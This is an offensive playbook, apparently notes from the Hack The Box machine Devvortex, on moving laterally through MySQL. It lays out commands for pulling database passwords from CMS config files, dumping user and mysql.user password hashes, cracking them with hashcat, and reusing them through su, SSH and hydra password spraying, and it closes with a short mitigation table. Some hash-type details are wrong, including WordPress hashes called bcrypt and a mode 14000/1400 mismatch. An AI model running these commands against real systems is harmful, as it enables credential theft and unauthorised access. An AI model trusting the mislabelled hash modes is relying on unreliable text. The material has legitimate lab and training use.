# MySQL Lateral Movement Playbook

> **Purpose:** Leverage database credentials to pivot from web shell to system access by extracting and cracking password hashes.

---

## 1. What Is This Technique?

MySQL lateral movement involves using database credentials obtained from web application configuration files (often `configuration.php`, `wp-config.php`, or similar) to:

1. Access the database server directly via `mysql` client
2. Extract password hashes for application users (admin panels, etc.)
3. Crack or reuse those hashes to gain elevated access
4. Pivot to additional system components or credentials

**Why This Works:**
- Web apps store admin credentials in databases
- Often reuse system user passwords for admin accounts
- Database server may have network access to other services
- `mysql` client often available on compromised systems

---

## 2. When to Use This Technique

| Scenario | Indicator | Action |
|---|---|---|
| Found CMS config file | `configuration.php`, `wp-config.php` in web root | Extract DB credentials |
| Database credentials in config | `$dbname`, `$dbuser`, `$dbpass` variables | Connect with `mysql` client |
| Admin password not reused | Cannot log into web admin panel directly | Crack the hash |
| User table accessible | Can query `SELECT * FROM users` | Extract and crack hashes |
| MySQL accessible locally | Port 3306 on localhost or via socket | Use `mysql` client |
| System user == DB user | DB user same as system account | Reuse credentials for SSH/su |

---

## 3. How to Execute

### Step 1 — Locate and Extract Database Credentials

```bash
# Joomla configuration
cat /var/www/joomla/configuration.php | grep -E "(dbname|dbuser|dbpass|host)"

# Extract values
grep -oP "(?<=dbname|dbuser|dbpass|host).*?['\"].*?['\"]" /var/www/joomla/configuration.php

# WordPress configuration
cat /var/www/html/wp-config.php | grep -E "(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)"
```

### Step 2 — Connect to MySQL

```bash
# Using credentials from config
mysql -u <DB_USER> -p<DB_PASS> -h localhost <DB_NAME>

# Or with interactive password prompt
mysql -u <DB_USER> -p -h localhost <DB_NAME>

# Check if socket-only access
mysql -u <DB_USER> -p<DB_PASS> <DB_NAME>  # Try without -h

# Verify connection
mysql> SELECT VERSION();
```

### Step 3 — Enumerate Database Structure

```bash
# List all databases
mysql> SHOW DATABASES;

# Switch to target database
mysql> USE <DATABASE_NAME>;

# List tables
mysql> SHOW TABLES;

# Describe table structure
mysql> DESCRIBE <TABLE_NAME>;
```

### Step 4 — Extract User Credentials

```bash
# Common user table queries

# Joomla users
mysql> SELECT username, email, password FROM jos_users;

# WordPress users  
mysql> SELECT user_login, user_pass FROM wp_users;

# Generic CMS
mysql> SELECT * FROM users;
mysql> SELECT * FROM administrators;
mysql> SELECT * FROM admin_users;
```

### Step 5 — Crack Password Hashes

```bash
# Save hashes to file (format: user:hash)
mysql> SELECT CONCAT(username, ':', password) FROM jos_users INTO OUTFILE '/tmp/hashes.txt';

# Or manually extract
cat /tmp/hashes.txt

# Identify hash type
# Joomla MD5: $2y$ or $2a$ (bcrypt) or MD5 with salt
# WordPress: $P$B... (bcrypt)
# Generic: MD5, SHA1, etc.

# Crack with hashcat
# Mode 3200 = bcrypt
hashcat -m 3200 -a 0 hashes.txt wordlist.txt

# Mode 400 = Joomla MD5
hashcat -m 400 -a 0 hashes.txt wordlist.txt

# Mode 14000 = SHA-256
hashcat -m 1400 -a 0 hashes.txt wordlist.txt
```

---

## 4. Common Commands Reference

### Discovery

```bash
# Find config files with DB credentials
find /var/www -name "configuration.php" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null

# Grep for credentials in web root
grep -r "dbpass\|dbuser\|password" /var/www/ 2>/dev/null

# Check for database credentials in memory/environment
env | grep -i db
cat /etc/environment 2>/dev/null
```

### Database Enumeration

```bash
# Connect and enumerate
mysql -u root -p<PASSWORD> -e "SHOW DATABASES;"
mysql -u root -p<PASSWORD> -e "USE mysql; SELECT user,host,password FROM user;"

# List all tables in all databases
mysql -u root -p<PASSWORD> -N -e "SHOW DATABASES;" | while read db; do 
    mysql -u root -p<PASSWORD> -N -e "USE $db; SHOW TABLES;" 2>/dev/null
done
```

### Hash Extraction Formats

```bash
# Joomla bcrypt (most common on modern Joomla)
# Format: $2y$10$XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

# WordPress bcrypt
# Format: $P$BXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

# Generic MD5
# Format: 5f4dcc3b5aa765d61d8327deb882cf99 (no salt)

# Extract specific columns
mysql> SELECT username, email, password, id FROM users WHERE id=1;
```

### Credential Reuse Testing

```bash
# Test password reuse for system accounts
su - administrator
su - www-data
su - root

# Test SSH if available
ssh user@target
ssh administrator@target

# Use tool for password spraying
hydra -L users.txt -p <PASSWORD> ssh://target
```

---

## 5. Devvortex-Specific Notes

In the Devvortex box:

```
Context: Joomla database with bcrypt-hashed admin passwords
Technique: Extracted hashes from jos_users table → cracked with hashcat
Result: Admin panel access → template injection → system shell
```

**Attack chain on Devvortex:**
1. CVE-2023-23752 disclosed Joomla API endpoint
2. Accessed users table via API, found hashed passwords
3. Cracked admin hash using wordlist + hashcat (mode 3200)
4. Logged into admin panel
5. Template injection to execute code
6. System shell via www-data

---

## 6. Troubleshooting

| Problem | Cause | Solution |
|---|---|---|
| `mysql: command not found` | Client not installed | Install with `apt install mysql-client` or use Python |
| Connection refused | MySQL not on localhost | Try 127.0.0.1 or check netstat |
| Access denied | Wrong credentials | Double-check config file parsing |
| Hash won't crack | Weak wordlist | Try rockyou.txt, custom lists, variations |
| Hash format unknown | Non-standard CMS | Identify CMS, research hash format |

---

## 7. Prevention/Mitigation

| Defense | Implementation |
|---|---|
| Strong unique passwords | Never reuse passwords across services |
| Separate DB and app credentials | DB creds should differ from admin panel creds |
| bcrypt with high cost factor | Use `$2y$10$` or higher, not MD5 |
| Principle of least privilege | DB user should only access needed tables |
| Network segmentation | MySQL should not be accessible from web |
| Monitor failed auth attempts | Alert on repeated DB connection failures |
| Rotate credentials regularly | Change DB and admin passwords periodically |

---

**Author:** Ceil (openclaw/neo workspace)  
**Source Box:** Devvortex (HTB)  
**Related:** [cms-template-injection.md](./cms-template-injection.md), [crash-file-generation.md](./crash-file-generation.md)
